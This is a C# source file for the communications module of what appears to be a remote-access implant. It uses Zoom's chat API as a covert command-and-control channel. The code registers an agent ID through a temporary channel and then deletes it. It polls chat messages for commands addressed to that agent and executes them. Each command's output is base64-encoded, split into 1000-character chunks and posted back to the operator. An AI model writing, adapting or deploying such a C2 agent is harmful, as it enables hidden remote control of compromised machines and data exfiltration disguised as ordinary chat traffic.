using RestSharp;
using RestSharp.Serialization.Json;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace Z2
{
   

    class Comms
    {

        public class getMessageResponse
        {
            public string date { get; set; }
            public string page_size { get; set; }
            public string next_page_token { get; set; }
            public List<Dictionary<string, string>> messages { get; set; }

        }

        public class postMessageResponse
        {
            public string id { get; set; }
        }
        public class postFormat
        {
            public string message { get; set; }
            public string to_contact { get; set; }

        }


        //will need to be generated when created
        //time to sleep between requests in milliseconds
        private int sleepTime = 10000;
        private string username = "something@email.com";
        public string clientNumber = "123456";
        public string serverNumber = "000000";
        //end of generated variables
        public getMessageResponse gmr;
        public bool firstMsg = true;
        public bool contRun = true;
        
        public string lastMessageId = "";
        public string at = "";
        public Stack<string> commandOutputQ = new Stack<string>();
        public Auth auth = new Auth();
        public Exec exec = new Exec();

      
        //https://stackoverflow.com/questions/11743160/how-do-i-encode-and-decode-a-base64-string
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        public int getAgent(string at)
        {
            bool create_channel = false;
            bool get_AN = false;
            string channelID = "";
            while (true){
                // only run this if channel has not been created sucessfully
                if (create_channel != true)
                {
                    var client = new RestClient($"https://api.zoom.us/v2/chat/users/me/channels");
                    client.Timeout = -1;
                    var request = new RestRequest(Method.POST);
                    request.AddHeader("Authorization", $"Bearer {at}");
                    request.AddJsonBody(
                        new
                        {
                            name = "agent channel",
                            type = 1
                        });
                    IRestResponse response = client.Execute(request);
                    Thread.Sleep(sleepTime);
                    // if good response then channel succesfully created
                  
                    if ((int)response.StatusCode == 200)
                    {
                        create_channel = true;
                        var newId = new JsonDeserializer().Deserialize<postMessageResponse>(response);
                        // get the created channels ID
                        channelID = newId.id;
                        Console.WriteLine($"channel id is {channelID}");
                    }
                    //if not successfuly try and reauth
                    else
                    {
                        auth.beginAuth();
                        at = auth.currentAt;
                    }
                }
                // if channel has been created but agent number not found run
                if (create_channel == true & get_AN != true)
                {
                    var client = new RestClient($"https://api.zoom.us/v2/chat/users/me/messages?to_channel={channelID}");
                    client.Timeout = -1;
                    var request = new RestRequest(Method.GET);
                    request.AddHeader("Authorization", $"Bearer {at}");
                    IRestResponse response = client.Execute(request);
                    Thread.Sleep(sleepTime);
                    if ((int)response.StatusCode == 200)
                    {
                        getMessageResponse jsonresponse = new JsonDeserializer().Deserialize<getMessageResponse>(response);
                        //check if message exists
                        if (jsonresponse.messages.Count > 0)
                        {
                            clientNumber = jsonresponse.messages[0]["message"];
                            Console.WriteLine($"client num is {clientNumber}");
                            get_AN = true;
                        }

                    }
                    else
                    {
                        auth.beginAuth();
                        at = auth.currentAt;
                    }
                }
                // if agent number has been found then delete the channel
                if (get_AN == true)
                {
                        var client = new RestClient($"https://api.zoom.us/v2/chat/channels/{channelID}");
                        client.Timeout = -1;
                        var request = new RestRequest(Method.DELETE);
                        request.AddHeader("Authorization", $"Bearer {at}");
                        IRestResponse response = client.Execute(request);
                        Thread.Sleep(sleepTime);
                        // if delete goes through then return
                        if ((int)response.StatusCode == 204)
                        {
                            Console.WriteLine("Channel Deleted");
                            return 1;

                        }
                        else
                        {
                            auth.beginAuth();
                            at = auth.currentAt;
                        }
                    }


            }

        }


        public void checkin()
        {
            //try original token first
            at = auth.currentAt;
            //get agent number
            getAgent(at);


            while (contRun)
            {
                if (commandOutputQ.Count == 0)
                {
                    
                    //if we fail to get new messages attempt to reauthenticate
                    if (getMessage(at) == -1)
                    {
                        Thread.Sleep(sleepTime);
                        auth.beginAuth();
                        at = auth.currentAt;
                    }
                    //ensures only one sleep per cycle
                    else { Thread.Sleep(sleepTime); }
                }

                else
                {

                    if (postMessage(at) == -1)
                    {
                        Thread.Sleep(sleepTime);
                        auth.beginAuth();
                        at = auth.currentAt;

                    }
                    //ensures only one sleep per cycle
                    else { Thread.Sleep(sleepTime); }
                }
            }

            
        }

        public int getMessage(string at)
        {
            var client = new RestClient($"https://api.zoom.us/v2/chat/users/me/messages?to_contact={username}");
            client.Timeout = -1;
            var request = new RestRequest(Method.GET);
            request.AddHeader("Authorization", $"Bearer {at}");
            IRestResponse response = client.Execute(request);

  
            switch ((int)response.StatusCode)
            {
                case 200:
                    break;
                case 429:
                    this.sleepTime += this.sleepTime + 1000;
                    return 0;
                case 401:
                    return -1;
                default:
                    return -1;

            }
      
            this.gmr = new JsonDeserializer().Deserialize<getMessageResponse>(response);
            
            parseMsg();
          
          
            return 0;
        }

        public void buildMsg(string fullOutput)
        {
            fullOutput = Base64Encode(fullOutput);
            int length = fullOutput.Length;
            int remainingChars = length;
            int maxLength = 1000; //1024 max char limit for send api
            double totalBlocks = (double)length/maxLength;
            int roundedBlocks = (int)Math.Ceiling(totalBlocks);
            int nChars;
            string msgBlock;
            string msg;

            for (int i = 0; i < totalBlocks; i++)
            {
          
                if (remainingChars > maxLength) { nChars = maxLength; } else { nChars = remainingChars; }
                msg = fullOutput.Substring((i * 1000) + 0, nChars);//start substring at 0, incrementing by 1000
                msgBlock = $"0:{clientNumber}:{i+1}:{roundedBlocks}:{msg}";
                this.commandOutputQ.Push(msgBlock);
                remainingChars = remainingChars - 1000;
            }
                 
            //output format for message blocks
           //agentNumber:blockNumber:numberofBlocks:output
           //6 digit agent number + 2 digit blockNumber + 2 digit totalBlocks + 3 colons = 14 char (24 just in case)

            
        }

        public void parseMsg()
        {
            if (firstMsg == true)
            {
                try
                {
                    this.lastMessageId = this.gmr.messages[0]["id"];
                }
                catch { }//attempt to set lastMessageId, if it fails most likely no messages yet so no need to do anything on exception
                firstMsg = false;
            }
            
            // need to read all message til up to most recent otherwise will miss cocurrent commands
            if (this.gmr.messages.Count > 0 && this.gmr.messages[0]["id"] != this.lastMessageId)
            {
                foreach (Dictionary<string,string> cmd in this.gmr.messages)
                {
                    if (cmd["id"] != this.lastMessageId)
                    {
                        try
                        {
                            //check if meant for clients
                            if (cmd["message"].Split(":")[0] == "1")
                            {
                                if (cmd["message"].Split(":")[1] == clientNumber)
                                {
                                    //needs to parse what kind of command
                                    buildMsg(exec.newCmd(cmd["message"][2..]));
                                }
                            }
                        }
                        catch {  }
                    }
                    else { break; } //if we found the last message exit loop
                }
               
                this.lastMessageId = this.gmr.messages[0]["id"];

            }

        }
        public int postMessage(string at)
        {
            
            var client = new RestClient($"https://api.zoom.us/v2/chat/users/me/messages");
            client.Timeout = -1;
            var request = new RestRequest(Method.POST);
            request.AddHeader("Authorization", $"Bearer {at}");
           
            var postMsg = new postFormat { message = commandOutputQ.Pop(), to_contact = username };
            request.AddJsonBody(postMsg);
            IRestResponse response = client.Execute(request);
            switch ((int)response.StatusCode)
            {
                case 201: //Success
                    break;
                case 429: //Exceeded rate limit
                    this.sleepTime += this.sleepTime + 10000;
                    return 0;
                case 401: //Auth failed
                    return -1;
                default: 

                    return -1;

            }
            var newId = new JsonDeserializer().Deserialize<postMessageResponse>(response);

            //this line is problamatic, if agent responds and another message is waiting then it wont respond
            //this.lastMessageId = newId.id;
            

            return 0;
        }

    }
}
